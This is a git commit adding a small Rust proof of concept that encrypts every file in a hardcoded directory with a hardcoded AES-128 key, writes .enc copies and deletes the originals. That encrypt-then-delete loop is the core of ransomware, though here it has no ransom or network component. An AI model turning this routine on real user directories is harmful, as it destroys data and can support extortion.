3a91505602272c56fc11ba2c7974fa846b7e7d65
Alex Juarez <karmatr0n.dixit@gmail.com>
2022-07-05 21:16:16 -0500

    For to encrypt directory with AES

---
+++ encrypt_dir/README.md
@@ -0,0 +1,22 @@
+# Descrition
+This is a PoC to encrypt all files in a directory with rust.
+
+The program has a harcoded key and harcoded directory in the source code.
+Feel free to change that.
+
+# How to build the executable?
+```azure
+cargo build --release
+```
+
+# How to install it?
+```azure
+cargo install
+```
+
+# How to use it?
+```azure
+encrypt_dir
+```
+# TODO
+1. Accept argurments for the password and the directory.
---
+++ encrypt_dir/src/main.rs
@@ -0,0 +1,102 @@
+extern crate aesstream;
+extern crate crypto;
+
+use aesstream::AesWriter;
+use crypto::aessafe::AesSafe128Encryptor;
+use hex_literal::hex;
+use regex::Regex;
+use std::fs;
+use std::fs::File;
+use std::io::{Read, Write};
+use std::path::Path;
+use walkdir::{DirEntry, WalkDir};
+
+fn is_dir_or_encrypted(entry: &DirEntry) -> bool {
+    let re = Regex::new(r"\.enc$").unwrap();
+    entry.file_type().is_dir() || re.is_match(entry.file_name().to_str().unwrap())
+}
+
+fn main() {
+    let password: [u8; 16] = hex!("DEADBEEFDEADBEEFDEADBEEFDEADBEEF");
+    let src_dir = "/var/tmp/test";
+
+    for entry in WalkDir::new(src_dir)
+        .into_iter()
+        .filter_map(Result::ok)
+        .filter(|e| !is_dir_or_encrypted(e))
+    {
+        let path_display = entry.path().display();
+        println!("Reading file: {}", path_display);
+
+        let mut input_file = match File::open(entry.path()) {
+            Err(why) => {
+                println!("couldn't read from {}: {}", path_display, why);
+                continue;
+            }
+            Ok(input_file) => input_file,
+        };
+
+        let metadata = match fs::metadata(entry.path()) {
+            Err(why) => {
+                println!("unable to read metadata from {}: {}", path_display, why);
+                continue;
+            }
+            Ok(metadata) => metadata,
+        };
+
+        let mut buffer = vec![0; metadata.len() as usize];
+        match input_file.read(&mut buffer) {
+            Err(why) => {
+                println!("unable to read data from {}: {}", path_display, why);
+                continue;
+            }
+            Ok(buffer) => buffer,
+        };
+
+        let mut enc = Vec::new();
+        {
+            let encryptor = AesSafe128Encryptor::new(&password);
+            let mut writer = match AesWriter::new(&mut enc, encryptor) {
+                Err(why) => {
+                    println!("couldn't encrypt {}: {}", path_display, why);
+                    continue;
+                }
+                Ok(writer) => writer,
+            };
+
+            match writer.write_all(&mut buffer) {
+                Err(why) => {
+                    println!(
+                        "couldn't write the encrypted bytes into the buffer for {}: {}",
+                        path_display, why
+                    );
+                    continue;
+                }
+                Ok(_) => (()),
+            };
+        }
+
+        let new_path = format!("{}.enc", entry.path().as_os_str().to_str().unwrap());
+        let encrypted_path = Path::new(&new_path);
+        let encrypted_path_display = encrypted_path.display();
+        println!("Encrypting file: {}", encrypted_path_display);
+
+        let mut output_file = match File::create(&encrypted_path) {
+            Err(why) => {
+                println!("couldn't create {}: {}", encrypted_path_display, why);
+                continue;
+            }
+            Ok(output_file) => output_file,
+        };
+
+        match output_file.write_all(enc.as_slice()) {
+            Err(why) => {
+                println!("couldn't write to {}: {}", encrypted_path_display, why);
+                continue;
+            }
+            Ok(_) => println!("successfully wrote to {}", encrypted_path_display),
+        };
+
+        fs::remove_file(entry.path()).expect("File delete failed");
+    }
+}
